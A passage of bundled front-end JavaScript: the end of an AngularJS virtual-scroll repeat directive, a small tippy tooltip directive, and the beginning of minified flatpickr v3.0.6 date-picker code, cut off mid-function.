                                    Math.floor(
                                        ($scrollPosition - $scope.offsetBefore - scrollOffset) / $scope.elementSize
                                    ) - $scope.excess / 2,
                                    0
                                );

                                __endIndex = Math.min(
                                    __startIndex + Math.ceil(
                                        $clientSize / $scope.elementSize
                                    ) + $scope.excess,
                                    originalLength
                                );
                            }

                            _minStartIndex = Math.min(__startIndex, _minStartIndex);
                            _maxEndIndex = Math.max(__endIndex, _maxEndIndex);

                            $scope.startIndex = $$options.latch ? _minStartIndex : __startIndex;
                            $scope.endIndex = $$options.latch ? _maxEndIndex : __endIndex;

                            var digestRequired = false;
                            if (_prevStartIndex == null) {
                                digestRequired = true;
                            }
                            else if (_prevEndIndex == null) {
                                digestRequired = true;
                            }

                            if (!digestRequired) {
                                if ($$options.hunked) {
                                    if (Math.abs($scope.startIndex - _prevStartIndex) >= $scope.excess / 2 ||
                                        ($scope.startIndex === 0 && _prevStartIndex !== 0)) {
                                        digestRequired = true;
                                    }
                                    else if (Math.abs($scope.endIndex - _prevEndIndex) >= $scope.excess / 2 ||
                                        ($scope.endIndex === originalLength && _prevEndIndex !== originalLength)) {
                                        digestRequired = true;
                                    }
                                }
                                else {
                                    digestRequired = $scope.startIndex !== _prevStartIndex ||
                                        $scope.endIndex !== _prevEndIndex;
                                }
                            }

                            if (digestRequired) {
                                // +5 可以用来进行 preload 的行为，让画面刷新感降低
                                $scope[collectionName] = originalCollection.slice($scope.startIndex, $scope.endIndex + 5);

                                // Emit the event
                                // $scope.$emit('vsRepeatInnerCollectionUpdated', $scope.startIndex, $scope.endIndex, _prevStartIndex, _prevEndIndex);

                                if ($attrs.vsScrolledToEnd) {
                                    var triggerIndex = originalCollection.length - ($scope.scrolledToEndOffset || 0);
                                    if (($scope.endIndex >= triggerIndex && _prevEndIndex < triggerIndex) || (originalCollection.length && $scope.endIndex === originalCollection.length)) {
                                        $scope.$eval($attrs.vsScrolledToEnd);
                                    }
                                }

                                _prevStartIndex = $scope.startIndex;
                                _prevEndIndex = $scope.endIndex;

                                var offsetCalculationString = sizesPropertyExists ?
                                    '(sizesCumulative[$index + startIndex] + offsetBefore)' :
                                    '(($index + startIndex) * elementSize + offsetBefore)';

                                var parsed = $parse(offsetCalculationString);
                                var o1 = parsed($scope, { $index: 0 });
                                var o2 = parsed($scope, { $index: $scope[collectionName].length });
                                var total = $scope.totalSize;
                                
                                $beforeContent.css(getLayoutProp(), o1 + 'px');
                                $afterContent.css(getLayoutProp(), (total - o2) + 'px');
                            }
                            return digestRequired;
                        }
                    }
                };
            }
        };
    }]);

    if (typeof module !== 'undefined' && module.exports) {
        module.exports = vsRepeatModule.name;
    }
})(window, window.angular);

angular.module('tippy', []).directive('tippy', function($timeout, $rootScope) {
    return {
        restrict: 'A',
        link: function ($scope, element, attrs, controllersArr) {

            let instance = null;

            init();

            attrs.$observe('tippyContent', function (val) {
                init();
            });
            
            function init () {
                if (instance) {
                    instance.destroy();
                }
                instance = tippy(element[0], {
                    animation: 'scale',
                    arrow: false,
                    content: attrs.tippyContent || '',
                    placement: attrs.tippyPlacement || 'right',
                    allowHTML: true,
                });
            }
        }
    }
});
/*! flatpickr v3.0.6, @license MIT */
function FlatpickrInstance(e,t){function n(e){return e.bind(De)}function a(e){De.config.noCalendar&&!De.selectedDates.length&&(De.selectedDates=[De.now]),he(e),De.selectedDates.length&&(!De.minDateHasTime||"input"!==e.type||e.target.value.length>=2?(i(),le()):setTimeout(function(){i(),le()},1e3))}function i(){if(De.config.enableTime){var e=(parseInt(De.hourElement.value,10)||0)%(De.amPM?12:24),t=(parseInt(De.minuteElement.value,10)||0)%60,n=De.config.enableSeconds?(parseInt(De.secondElement.value,10)||0)%60:0;void 0!==De.amPM&&(e=e%12+12*("PM"===De.amPM.textContent)),De.minDateHasTime&&0===pe(De.latestSelectedDateObj,De.config.minDate)&&(e=Math.max(e,De.config.minDate.getHours()))===De.config.minDate.getHours()&&(t=Math.max(t,De.config.minDate.getMinutes())),De.maxDateHasTime&&0===pe(De.latestSelectedDateObj,De.config.maxDate)&&(e=Math.min(e,De.config.maxDate.getHours()))===De.config.maxDate.getHours()&&(t=Math.min(t,De.config.maxDate.getMinutes())),o(e,t,n)}}function r(e){var t=e||De.latestSelectedDateObj;t&&o(t.getHours(),t.getMinutes(),t.getSeconds())}function o(e,t,n){De.selectedDates.length&&De.latestSelectedDateObj.setHours(e%24,t,n||0,0),De.config.enableTime&&!De.isMobile&&(De.hourElement.value=De.pad(De.config.time_24hr?e:(12+e)%12+12*(e%12==0)),De.minuteElement.value=De.pad(t),De.config.time_24hr||(De.amPM.textContent=e>=12?"PM":"AM"),!0===De.config.enableSeconds&&(De.secondElement.value=De.pad(n)))}function l(e){var t=e.target.value;e.delta&&(t=(parseInt(t)+e.delta).toString()),4!==t.length&&"Enter"!==e.key||(De.currentYearElement.blur(),/[^\d]/.test(t)||O(t))}function c(e,t,n){return t instanceof Array?t.forEach(function(t){return c(e,t,n)}):e instanceof Array?e.forEach(function(e){return c(e,t,n)}):(e.addEventListener(t,n),void De._handlers.push({element:e,event:t,handler:n}))}function s(e){return function(t){return 1===t.which&&e(t)}}function d(){if(De._handlers=[],De._animationLoop=[],De.config.wrap&&["open","close","toggle","clear"].forEach(function(e){Array.prototype.forEach.call(De.element.querySelectorAll("[data-"+e+"]"),function(t){return c(t,"mousedown",s(De[e]))})}),De.isMobile)return ee();if(De.debouncedResize=ge(j,50),De.triggerChange=function(){ne("Change")},De.debouncedChange=ge(De.triggerChange,300),"range"===De.config.mode&&De.daysContainer&&c(De.daysContainer,"mouseover",function(e){return P(e.target)}),c(window.document.body,"keydown",L),De.config.static||c(De._input,"keydown",L),De.config.inline||De.config.static||c(window,"resize",De.debouncedResize),void 0!==window.ontouchstart&&c(window.document,"touchstart",Y),c(window.document,"mousedown",s(Y)),c(De._input,"blur",Y),!0===De.config.clickOpens&&(c(De._input,"focus",De.open),c(De._input,"mousedown",s(De.open))),De.config.noCalendar||(De.monthNav.addEventListener("wheel",function(e){return e.preventDefault()}),c(De.monthNav,"wheel",ge(se,10)),c(De.monthNav,"mousedown",s(de)),c(De.monthNav,["keyup","increment"],l),c(De.daysContainer,"mousedown",s(U)),De.config.animate&&(c(De.daysContainer,["webkitAnimationEnd","animationend"],f),c(De.monthNav,["webkitAnimationEnd","animationend"],m))),De.config.enableTime){var e=function(e){return e.target.select()};c(De.timeContainer,["wheel","input","increment"],a),c(De.timeContainer,"mousedown",s(p)),c(De.timeContainer,["wheel","increment"],De.debouncedChange),c(De.timeContainer,"input",De.triggerChange),c([De.hourElement,De.minuteElement],"focus",e),void 0!==De.secondElement&&c(De.secondElement,"focus",function(){return De.secondElement.select()}),void 0!==De.amPM&&c(De.amPM,"mousedown",s(function(e){a(e),De.triggerChange(e)}))}}function u(){for(var e=De._animationLoop.length;e--;)De._animationLoop[e](),De._animationLoop.splice(e,1)}function f(e){if(De.daysContainer.childNodes.length>1)switch(e.animationName){case"fpSlideLeft":De.daysContainer.lastChild.classList.remove("slideLeftNew"),De.daysContainer.removeChild(De.daysContainer.firstChild),De.days=De.daysContainer.firstChild,u();break;case"fpSlideRight":De.daysContainer.firstChild.classList.remove("slideRightNew"),De.daysContainer.removeChild(De.daysContainer.lastChild),De.days=De.daysContainer.firstChild,u()}}function m(e){switch(e.animationName){case"fpSlideLeftNew":case"fpSlideRightNew":De.navigationCurrentMonth.classList.remove("slideLeftNew"),De.navigationCurrentMonth.classList.remove("slideRightNew");for(var t=De.navigationCurrentMonth;t.nextSibling&&/curr/.test(t.nextSibling.className);)De.monthNav.removeChild(t.nextSibling);for(;t.previousSibling&&/curr/.test(t.previousSibling.className);)De.monthNav.removeChild(t.previousSibling);De.oldCurMonth=null}}function g(e){e=e?De.parseDate(e):De.latestSelectedDateObj||(De.config.minDate>De.now?De.config.minDate:De.config.maxDate&&De.config.maxDate<De.now?De.config.maxDate:De.now);try{De.currentYear=e.getFullYear(),De.currentMonth=e.getMonth()}catch(t){console.error(t.stack),console.warn("Invalid date supplied: "+e)}De.redraw()}function p(e){~e.target.className.indexOf("arrow")&&h(e,e.target.classList.contains("arrowUp")?1:-1)}function h(e,t,n){var a=n||e.target.parentNode.childNodes[0],i=ae("increment");i.delta=t,a.dispatchEvent(i)}function D(e){var t=ue("div","numInputWrapper"),n=ue("input","numInput "+e),a=ue("span","arrowUp"),i=ue("span","arrowDown");return n.type="text",n.pattern="\\d*",t.appendChild(n),t.appendChild(a),t.appendChild(i),t}function v(){var e=window.document.createDocumentFragment();De.calendarContainer=ue("div","flatpickr-calendar"),De.calendarContainer.tabIndex=-1,De.config.noCalendar||(e.appendChild(k()),De.innerContainer=ue("div","flatpickr-innerContainer"),De.config.weekNumbers&&De.innerContainer.appendChild(N()),De.rContainer=ue("div","flatpickr-rContainer"),De.rContainer.appendChild(E()),De.daysContainer||(De.daysContainer=ue("div","flatpickr-days"),De.daysContainer.tabIndex=-1),M(),De.rContainer.appendChild(De.daysContainer),De.innerContainer.appendChild(De.rContainer),e.appendChild(De.innerContainer)),De.config.enableTime&&e.appendChild(x()),me(De.calendarContainer,"rangeMode","range"===De.config.mode),me(De.calendarContainer,"animate",De.config.animate),De.calendarContainer.appendChild(e);var t=De.config.appendTo&&De.config.appendTo.nodeType;if(De.config.inline||De.config.static){if(De.calendarContainer.classList.add(De.config.inline?"inline":"static"),De.config.inline&&!t)return De.element.parentNode.insertBefore(De.calendarContainer,De._input.nextSibling);if(De.config.static){var n=ue("div","flatpickr-wrapper");return De.element.parentNode.insertBefore(n,De.element),n.appendChild(De.element),De.altInput&&n.appendChild(De.altInput),void n.appendChild(De.calendarContainer)}}(t?De.config.appendTo:window.document.body).appendChild(De.calendarContainer)}function C(e,t,n,a){var i=A(t,!0),r=ue("span","flatpickr-day "+e,t.getDate());return r.dateObj=t,r.$i=a,r.setAttribute("aria-label",De.formatDate(t,De.config.ariaDateFormat)),0===pe(t,De.now)&&(De.todayDateElem=r,r.classList.add("today")),i?(r.tabIndex=-1,ie(t)&&(r.classList.add("selected"),De.selectedDateElem=r,"range"===De.config.mode&&(me(r,"startRange",0===pe(t,De.selectedDates[0])),me(r,"endRange",0===pe(t,De.selectedDates[1]))))):(r.classList.add("disabled"),De.selectedDates[0]&&t>De.minRangeDate&&t<De.selectedDates[0]?De.minRangeDate=t:De.selectedDates[0]&&t<De.maxRangeDate&&t>De.selectedDates[0]&&(De.maxRangeDate=t)),"range"===De.config.mode&&(re(t)&&!ie(t)&&r.classList.add("inRange"),1===De.selectedDates.length&&(t<De.minRangeDate||t>De.maxRangeDate)&&r.classList.add("notAllowed")),De.config.weekNumbers&&"prevMonthDay"!==e&&n%7==1&&De.weekNumbers.insertAdjacentHTML("beforeend","<span class='disabled flatpickr-day'>"+De.config.getWeek(t)+"</span>"),ne("DayCreate",r),r}function w(e,t){var n=e+t||0,a=void 0!==e?De.days.childNodes[n]:De.selectedDateElem||De.todayDateElem||De.days.childNodes[0],i=function(){(a=a||De.days.childNodes[n]).focus(),"range"===De.config.mode&&P(a)};if(void 0===a&&0!==t)return t>0?(De.changeMonth(1),n%=42):t<0&&(De.changeMonth(-1),n+=42),b(i);i()}function b(e){if(!0===De.config.animate)return De._animationLoop.push(e);e()}function M(e){var t=(new Date(De.currentYear,De.currentMonth,1).getDay()-De.l10n.firstDayOfWeek+7)%7,n="range"===De.config.mode;De.prevMonthDays=De.utils.getDaysinMonth((De.currentMonth-1+12)%12),De.selectedDateElem=void 0,De.todayDateElem=void 0;var a=De.utils.getDaysinMonth(),i=window.document.createDocumentFragment(),r=De.prevMonthDays+1-t,o=0;for(De.config.weekNumbers&&De.weekNumbers.firstChild&&(De.weekNumbers.textContent=""),n&&(De.minRangeDate=new Date(De.currentYear,De.currentMonth-1,r),De.maxRangeDate=new Date(De.currentYear,De.currentMonth+1,(42-t)%a));r<=De.prevMonthDays;r++,o++)i.appendChild(C("prevMonthDay",new Date(De.currentYear,De.currentMonth-1,r),r,o));for(r=1;r<=a;r++,o++)i.appendChild(C("",new Date(De.currentYear,De.currentMonth,r),r,o));for(var l=a+1;l<=42-t;l++,o++)i.appendChild(C("nextMonthDay",new Date(De.currentYear,De.currentMonth+1,l%a),l,o));n&&1===De.selectedDates.length&&i.childNodes[0]?(De._hidePrevMonthArrow=De._hidePrevMonthArrow||De.minRangeDate>i.childNodes[0].dateObj,De._hideNextMonthArrow=De._hideNextMonthArrow||De.maxRangeDate<new Date(De.currentYear,De.currentMonth+1,1)):oe();var c=ue("div","dayContainer");if(c.appendChild(i),De.config.animate&&void 0!==e)for(;De.daysContainer.childNodes.length>1;)De.daysContainer.removeChild(De.daysContainer.firstChild);else y(De.daysContainer);return e>=0?De.daysContainer.appendChild(c):De.daysContainer.insertBefore(c,De.daysContainer.firstChild),De.days=De.daysContainer.firstChild,De.daysContainer}function y(e){for(;e.firstChild;)e.removeChild(e.firstChild)}function k(){var e=window.document.createDocumentFragment();De.monthNav=ue("div","flatpickr-month"),De.prevMonthNav=ue("span","flatpickr-prev-month"),De.prevMonthNav.innerHTML=De.config.prevArrow,De.currentMonthElement=ue("span","cur-month"),De.currentMonthElement.title=De.l10n.scrollTitle;var t=D("cur-year");return De.currentYearElement=t.childNodes[0],De.currentYearElement.title=De.l10n.scrollTitle,De.config.minDate&&(De.currentYearElement.min=De.config.minDate.getFullYear()),De.config.maxDate&&(De.currentYearElement.max=De.config.maxDate.getFullYear(),De.currentYearElement.disabled=De.config.minDate&&De.config.minDate.getFullYear()===De.config.maxDate.getFullYear()),De.nextMonthNav=ue("span","flatpickr-next-month"),De.nextMonthNav.innerHTML=De.config.nextArrow,De.navigationCurrentMonth=ue("span","flatpickr-current-month"),De.navigationCurrentMonth.appendChild(De.currentMonthElement),De.navigationCurrentMonth.appendChild(t),e.appendChild(De.prevMonthNav),e.appendChild(De.navigationCurrentMonth),e.appendChild(De.nextMonthNav),De.monthNav.appendChild(e),Object.defineProperty(De,"_hidePrevMonthArrow",{get:function(){return this.__hidePrevMonthArrow},set:function(e){this.__hidePrevMonthArrow!==e&&(De.prevMonthNav.style.display=e?"none":"block"),this.__hidePrevMonthArrow=e}}),Object.defineProperty(De,"_hideNextMonthArrow",{get:function(){return this.__hideNextMonthArrow},set:function(e){this.__hideNextMonthArrow!==e&&(De.nextMonthNav.style.display=e?"none":"block"),this.__hideNextMonthArrow=e}}),oe(),De.monthNav}function x(){De.calendarContainer.classList.add("hasTime"),De.config.noCalendar&&De.calendarContainer.classList.add("noCalendar"),De.timeContainer=ue("div","flatpickr-time"),De.timeContainer.tabIndex=-1;var e=ue("span","flatpickr-time-separator",":"),t=D("flatpickr-hour");De.hourElement=t.childNodes[0];var n=D("flatpickr-minute");if(De.minuteElement=n.childNodes[0],De.hourElement.tabIndex=De.minuteElement.tabIndex=-1,De.hourElement.value=De.pad(De.latestSelectedDateObj?De.latestSelectedDateObj.getHours():De.config.defaultHour),De.minuteElement.value=De.pad(De.latestSelectedDateObj?De.latestSelectedDateObj.getMinutes():De.config.defaultMinute),De.hourElement.step=De.config.hourIncrement,De.minuteElement.step=De.config.minuteIncrement,De.hourElement.min=De.config.time_24hr?0:1,De.hourElement.max=De.config.time_24hr?23:12,De.minuteElement.min=0,De.minuteElement.max=59,De.hourElement.title=De.minuteElement.title=De.l10n.scrollTitle,De.timeContainer.appendChild(t),De.timeContainer.appendChild(e),De.timeContainer.appendChild(n),De.config.time_24hr&&De.timeContainer.classList.add("time24hr"),De.config.enableSeconds){De.timeContainer.classList.add("hasSeconds");var a=D("flatpickr-second");De.secondElement=a.childNodes[0],De.secondElement.value=De.latestSelectedDateObj?De.pad(De.latestSelectedDateObj.getSeconds()):"00",De.secondElement.step=De.minuteElement.step,De.secondElement.min=De.minuteElement.min,De.secondElement.max=De.minuteElement.max,De.timeContainer.appendChild(ue("span","flatpickr-time-separator",":")),De.timeContainer.appendChild(a)}return De.config.time_24hr||(De.amPM=ue("span","flatpickr-am-pm",["AM","PM"][De.hourElement.value>11|0]),De.amPM.title=De.l10n.toggleTitle,De.amPM.tabIndex=-1,De.timeContainer.appendChild(De.amPM)),De.timeContainer}function E(){De.weekdayContainer||(De.weekdayContainer=ue("div","flatpickr-weekdays"));var e=De.l10n.firstDayOfWeek,t=De.l10n.weekdays.shorthand.slice();return e>0&&e<t.length&&(t=[].concat(t.splice(e,t.length),t.splice(0,e))),De.weekdayContainer.innerHTML="\n\t\t<span class=flatpickr-weekday>\n\t\t\t"+t.join("</span><span class=flatpickr-weekday>")+"\n\t\t</span>\n\t\t",De.weekdayContainer}function N(){return De.calendarContainer.classList.add("hasWeeks"),De.weekWrapper=ue("div","flatpickr-weekwrapper"),De.weekWrapper.appendChild(ue("span","flatpickr-weekday",De.l10n.weekAbbreviation)),De.weekNumbers=ue("div","flatpickr-weeks"),De.weekWrapper.appendChild(De.weekNumbers),De.weekWrapper}function _(e,t,n){var a=(t=void 0===t||t)?e:e-De.currentMonth,i=!De.config.animate||!1===n;if(!(a<0&&De._hidePrevMonthArrow||a>0&&De._hideNextMonthArrow)){if(De.currentMonth+=a,(De.currentMonth<0||De.currentMonth>11)&&(De.currentYear+=De.currentMonth>11?1:-1,De.currentMonth=(De.currentMonth+12)%12,ne("YearChange")),M(i?void 0:a),i)return ne("MonthChange"),oe();var r=De.navigationCurrentMonth;if(a<0)for(;r.nextSibling&&/curr/.test(r.nextSibling.className);)De.monthNav.removeChild(r.nextSibling);else if(a>0)for(;r.previousSibling&&/curr/.test(r.previousSibling.className);)De.monthNav.removeChild(r.previousSibling);if(De.oldCurMonth=De.navigationCurrentMonth,De.navigationCurrentMonth=De.monthNav.insertBefore(De.oldCurMonth.cloneNode(!0),a>0?De.oldCurMonth.nextSibling:De.oldCurMonth),a>0?(De.daysContainer.firstChild.classList.add("slideLeft"),De.daysContainer.lastChild.classList.add("slideLeftNew"),De.oldCurMonth.classList.add("slideLeft"),De.navigationCurrentMonth.classList.add("slideLeftNew")):a<0&&(De.daysContainer.firstChild.classList.add("slideRightNew"),De.daysContainer.lastChild.classList.add("slideRight"),De.oldCurMonth.classList.add("slideRight"),De.navigationCurrentMonth.classList.add("slideRightNew")),De.currentMonthElement=De.navigationCurrentMonth.firstChild,De.currentYearElement=De.navigationCurrentMonth.lastChild.childNodes[0],oe(),De.oldCurMonth.firstChild.textContent=De.utils.monthToStr(De.currentMonth-a),ne("MonthChange"),document.activeElement&&document.activeElement.$i){var o=document.activeElement.$i;b(function(){w(o,0)})}}}function T(e){De.input.value="",De.altInput&&(De.altInput.value=""),De.mobileInput&&(De.mobileInput.value=""),De.selectedDates=[],De.latestSelectedDateObj=void 0,De.showTimeInput=!1,De.redraw(),!1!==e&&ne("Change")}function I(){De.isOpen=!1,De.isMobile||(De.calendarContainer.classList.remove("open"),De._input.classList.remove("active")),ne("Close")}function S(){void 0!==De.config&&ne("Destroy");for(var e=De._handlers.length;e--;){var t=De._handlers[e];t.element.removeEventListener(t.event,t.handler)}De._handlers=[],De.mobileInput?(De.mobileInput.parentNode&&De.mobileInput.parentNode.removeChild(De.mobileInput),De.mobileInput=null):De.calendarContainer&&De.calendarContainer.parentNode&&De.calendarContainer.parentNode.removeChild(De.calendarContainer),De.altInput&&(De.input.type="text",De.altInput.parentNode&&De.altInput.parentNode.removeChild(De.altInput),delete De.altInput),De.input&&(De.input.type=De.input._type,De.input.classList.remove("flatpickr-input"),De.input.removeAttribute("readonly"),De.input.value=""),["_showTimeInput","latestSelectedDateObj","_hideNextMonthArrow","_hidePrevMonthArrow","__hideNextMonthArrow","__hidePrevMonthArrow","isMobile","isOpen","selectedDateElem","minDateHasTime","maxDateHasTime","days","daysContainer","_input","_positionElement","innerContainer","rContainer","monthNav","todayDateElem","calendarContainer","weekdayContainer","prevMonthNav","nextMonthNav","currentMonthElement","currentYearElement","navigationCurrentMonth","selectedDateElem","config"].forEach(function(e){return delete De[e]})}function F(e){return!(!De.config.appendTo||!De.config.appendTo.contains(e))||De.calendarContainer.contains(e)}function Y(e){if(De.isOpen&&!De.config.inline){var t=F(e.target),n=e.target===De.input||e.target===De.altInput||De.element.contains(e.target)||e.path&&e.path.indexOf&&(~e.path.indexOf(De.input)||~e.path.indexOf(De.altInput));("blur"===e.type?n&&e.relatedTarget&&!F(e.relatedTarget):!n&&!t)&&-1===De.config.ignoredFocusElements.indexOf(e.target)&&(De.close(),"range"===De.config.mode&&1===De.selectedDates.length&&(De.clear(!1),De.redraw()))}}function O(e){if(!(!e||De.currentYearElement.min&&e<De.currentYearElement.min||De.currentYearElement.max&&e>De.currentYearElement.max)){var t=parseInt(e,10),n=De.currentYear!==t;De.currentYear=t||De.currentYear,De.config.maxDate&&De.currentYear===De.config.maxDate.getFullYear()?De.currentMonth=Math.min(De.config.maxDate.getMonth(),De.currentMonth):De.config.minDate&&De.currentYear===De.config.minDate.getFullYear()&&(De.currentMonth=Math.max(De.config.minDate.getMonth(),De.currentMonth)),n&&(De.redraw(),ne("YearChange"))}}function A(e,t){if(De.config.minDate&&pe(e,De.config.minDate,void 0!==t?t:!De.minDateHasTime)<0||De.config.maxDate&&pe(e,De.config.maxDate,void 0!==t?t:!De.maxDateHasTime)>0)return!1;if(!De.config.enable.length&&!De.config.disable.length)return!0;for(var n,a=De.parseDate(e,null,!0),i=De.config.enable.length>0,r=i?De.config.enable:De.config.disable,o=0;o<r.length;o++){if((n=r[o])instanceof Function&&n(a))return i;if(n instanceof Date&&n.getTime()===a.getTime())return i;if("string"==typeof n&&De.parseDate(n,null,!0).getTime()===a.getTime())return i;if("object"===(void 0===n?"undefined":_typeof(n))&&n.from&&n.to&&a>=n.from&&a<=n.to)return i}return!i}function L(e){var t=e.target===De._input,n=F(e.target),r=De.config.allowInput,o=De.isOpen&&(!r||!t),l=De.config.inline&&t&&!r;if("Enter"===e.key&&r&&t)return De.setDate(De._input.value,!0,e.target===De.altInput?De.config.altFormat:De.config.dateFormat),e.target.blur();if(n||o||l){var c=De.timeContainer&&De.timeContainer.contains(e.target);switch(e.key){case"Enter":c?le():U(e);break;case"Escape":e.preventDefault(),De.close();break;case"ArrowLeft":case"ArrowRight":if(!c)if(e.preventDefault(),De.daysContainer){var s="ArrowRight"===e.key?1:-1;e.ctrlKey?_(s,!0):w(e.target.$i,s)}else De.config.enableTime&&!c&&De.hourElement.focus();break;case"ArrowUp":case"ArrowDown":e.preventDefault();var d="ArrowDown"===e.key?1:-1;De.daysContainer?e.ctrlKey?(O(De.currentYear-d),w(e.target.$i,0)):c||w(e.target.$i,7*d):De.config.enableTime&&(c||De.hourElement.focus(),a(e));break;case"Tab":e.target===De.hourElement?(e.preventDefault(),De.minuteElement.select()):e.target===De.minuteElement&&(De.secondElement||De.amPM)?(e.preventDefault(),(De.secondElement||De.amPM).focus()):e.target===De.secondElement&&(e.preventDefault(),De.amPM.focus());break;case"a":e.target===De.amPM&&(De.amPM.textContent="AM",i(),le());break;case"p":e.target===De.amPM&&(De.amPM.textContent="PM",i(),le())}ne("KeyDown",e)}}function P(e){if(1===De.selectedDates.length&&e.classList.contains("flatpickr-day")){for(var t=e.dateObj,n=De.parseDate(De.selectedDates[0],null,!0),a=Math.min(t.getTime(),De.selectedDates[0].getTime()),i=Math.max(t.getTime(),De.selectedDates[0].getTime()),r=!1,o=a;o<i;o+=De.utils.duration.DAY)if(!A(new Date(o))){r=!0;break}for(var l=De.days.childNodes[0].dateObj.getTime(),c=0;c<42;c++,l+=De.utils.duration.DAY){(function(o,l){var c=o<De.minRangeDate.getTime()||o>De.maxRangeDate.getTime(),s=De.days.childNodes[l];if(c)return De.days.childNodes[l].classList.add("notAllowed"),["inRange","startRange","endRange"].forEach(function(e){s.classList.remove(e)}),"continue";if(r&&!c)return"continue";["startRange","inRange","endRange","notAllowed"].forEach(function(e){s.classList.remove(e)});var d=Math.max(De.minRangeDate.getTime(),a),u=Math.min(De.maxRangeDate.getTime(),i);e.classList.add(t<De.selectedDates[0]?"startRange":"endRange"),n<t&&o===n.getTime()?s.classList.add("startRange"):n>t&&o===n.getTime()&&s.classList.add("endRange"),o>=d&&o<=u&&s.classList.add("inRange")})(l,c)}}}function j(){!De.isOpen||De.config.static||De.config.inline||J()}function H(e,t){if(De.isMobile)return e&&(e.preventDefault(),e.target.blur()),setTimeout(function(){De.mobileInput.click()},0),void ne("Open");De.isOpen||De._input.disabled||De.config.inline||(De.isOpen=!0,De.calendarContainer.classList.add("open"),J(t),De._input.classList.add("active"),ne("Open"))}function R(e){return function(t){var n=De.config["_"+e+"Date"]=De.parseDate(t),a=De.config["_"+("min"===e?"max":"min")+"Date"],i=t&&n instanceof Date;i&&(De[e+"DateHasTime"]=n.getHours()||n.getMinutes()||n.getSeconds()),De.selectedDates&&(De.selectedDates=De.selectedDates.filter(function(e){return A(e)}),De.selectedDates.length||"min"!==e||r(n),le()),De.daysContainer&&(K(),i?De.currentYearElement[e]=n.getFullYear():De.currentYearElement.removeAttribute(e),De.currentYearElement.disabled=a&&n&&a.getFullYear()===n.getFullYear())}}function W(){var e=["wrap","weekNumbers","allowInput","clickOpens","time_24hr","enableTime","noCalendar","altInput","shorthandCurrentMonth","inline","static","enableSeconds","disableMobile"],t=["onChange","onClose","onDayCreate","onDestroy","onKeyDown","onMonthChange","onOpen","onParseConfig","onReady","onValueUpdate","onYearChange"];De.config=Object.create(flatpickr.defaultConfig);var a=_extends({},De.instanceConfig,JSON.parse(JSON.stringify(De.element.dataset||{})));De.config.parseDate=a.parseDate,De.config.formatDate=a.formatDate,Object.defineProperty(De.config,"enable",{get:function(){return De.config._enable||[]},set:function(e){return De.config._enable=G(e)}}),Object.defineProperty(De.config,"disable",{get:function(){return De.config._disable||[]},set:function(e){return De.config._disable=G(e)}}),_extends(De.config,a),!a.dateFormat&&a.enableTime&&(De.config.dateFormat=De.config.noCalendar?"H:i"+(De.config.enableSeconds?":S":""):flatpickr.defaultConfig.dateFormat+" H:i"+(De.config.enableSeconds?":S":"")),a.altInput&&a.enableTime&&!a.altFormat&&(De.config.altFormat=De.config.noCalendar?"h:i"+(De.config.enableSeconds?":S K":" K"):flatpickr.defaultConfig.altFormat+" h:i"+(De.config.enableSeconds?":S":"")+" K"),Object.defineProperty(De.config,"minDate",{get:function(){return this._minDate},set:R("min")}),Object.defineProperty(De.config,"maxDate",{get:function(){return this._maxDate},set:R("max")}),De.config.minDate=a.minDate,De.config.maxDate=a.maxDate;for(var i=0;i<e.length;i++)De.config[e[i]]=!0===De.config[e[i]]||"true"===De.config[e[i]];for(var r=t.length;r--;)void 0!==De.config[t[r]]&&(De.config[t[r]]=fe(De.config[t[r]]||[]).map(n));for(var o=0;o<De.config.plugins.length;o++){var l=De.config.plugins[o](De)||{};for(var c in l)De.config[c]instanceof Array||~t.indexOf(c)?De.config[c]=fe(l[c]).map(n).concat(De.config[c]):void 0===a[c]&&(De.config[c]=l[c])}ne("ParseConfig")}function B(){"object"!==_typeof(De.config.locale)&&void 0===flatpickr.l10ns[De.config.locale]&&console.warn("flatpickr: invalid locale "+De.config.locale),De.l10n=_extends(Object.create(flatpickr.l10ns.default),"object"===_typeof(De.config.locale)?De.config.locale:"default"!==De.config.locale?flatpickr.l10ns[De.config.locale]||{}:{})}function J(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:De._positionElement;if(void 0!==De.calendarContainer){var t=De.calendarContainer.offsetHeight,n=De.calendarContainer.offsetWidth,a=De.config.position,i=e.getBoundingClientRect(),r=window.innerHeight-i.bottom,o="above"===a||"below"!==a&&r<t&&i.top>t,l=window.pageYOffset+i.top+(o?-t-2:e.offsetHeight+2);if(me(De.calendarContainer,"arrowTop",!o),me(De.calendarContainer,"arrowBottom",o),!De.config.inline){var c=window.pageXOffset+i.left,s=window.document.body.offsetWidth-i.right,d=c+n>window.document.body.offsetWidth;me(De.calendarContainer,"rightMost",d),De.config.static||(De.calendarContainer.style.top=l+"px",d?(De.calendarContainer.style.left="auto",De.calendarContainer.style.right=s+"px"):(De.calendarContainer.style.left=c+"px",De.calendarContainer.style.right="auto"))}}}function K(){De.config.noCalendar||De.isMobile||(E(),oe(),M())}function U(e){if(e.preventDefault(),e.stopPropagation(),e.target.classList.contains("flatpickr-day")&&!e.target.classList.contains("disabled")&&!e.target.classList.contains("notAllowed")){var t=De.latestSelectedDateObj=new Date(e.target.dateObj.getTime()),n=t.getMonth()!==De.currentMonth&&"range"!==De.config.mode;if(De.selectedDateElem=e.target,"single"===De.config.mode)De.selectedDates=[t];else if("multiple"===De.config.mode){var a=ie(t);a?De.selectedDates.splice(a,1):De.selectedDates.push(t)}else"range"===De.config.mode&&(2===De.selectedDates.length&&De.clear(),De.selectedDates.push(t),0!==pe(t,De.selectedDates[0],!0)&&De.selectedDates.sort(function(e,t){return e.getTime()-t.getTime()}));if(i(),n){var o=De.currentYear!==t.getFullYear();De.currentYear=t.getFullYear(),De.currentMonth=t.getMonth(),o&&ne("YearChange"),ne("MonthChange")}if(M(),De.minDateHasTime&&De.config.enableTime&&0===pe(t,De.config.minDate)&&r(De.config.minDate),le(),De.config.enableTime&&setTimeout(function(){return De.showTimeInput=!0},50),"range"===De.config.mode&&(1===De.selectedDates.length?(P(e.target),De._hidePrevMonthArrow=De._hidePrevMonthArrow||De.minRangeDate>De.days.childNodes[0].dateObj,De._hideNextMonthArrow=De._hideNextMonthArrow||De.maxRangeDate<new Date(De.currentYear,De.currentMonth+1,1)):oe()),ne("Change"),n?b(function(){return De.selectedDateElem.focus()}):w(e.target.$i,0),De.config.enableTime&&setTimeout(function(){return De.hourElement.select()},451),De.config.closeOnSelect){var l="single"===De.config.mode&&!De.config.enableTime,c="range"===De.config.mode&&2===De.selectedDates.length&&!De.config.enableTime;(l||c)&&De.close()}}}function 